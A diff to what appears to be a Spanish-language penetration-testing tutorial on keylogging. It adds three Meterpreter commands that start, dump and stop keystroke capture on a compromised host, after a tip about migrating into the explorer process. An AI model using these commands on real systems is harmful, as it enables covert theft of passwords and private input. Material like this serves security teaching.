@@ -276,7 +276,9 @@ El keylogging es una técnica de captura de información que consiste en registr
 Para usar el módulo de metasploit puede ser necesario migrar al proceso `explorer`.
 
 ```bash
-
+meterpreter > keyscan_start # Inicia el escaneo de las pulsaciones del teclado
+meterpreter > keyscan_dump  # Muestra lo que se ha registrado
+meterpreter > keyscan_stop  # Detiene el escaneo
 ```
 
 [⟵ Anterior](01_intro.md) | [Siguiente ⟶](03_linux_enum.md)
